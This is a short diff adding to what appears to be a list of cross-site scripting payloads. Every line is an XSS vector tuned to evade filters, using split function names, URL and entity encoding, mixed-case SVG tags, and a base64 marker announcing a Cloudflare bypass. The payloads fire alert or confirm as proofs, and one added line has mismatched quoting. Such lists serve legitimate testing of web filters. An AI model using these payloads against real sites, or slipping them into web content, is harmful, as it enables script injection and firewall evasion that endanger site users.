@@ -1,3 +1,4 @@
+<svg/onload=window["al"+"ert"]`1337'>
 %23%27%2Aprompt%281%29%2A%27
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 %22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)
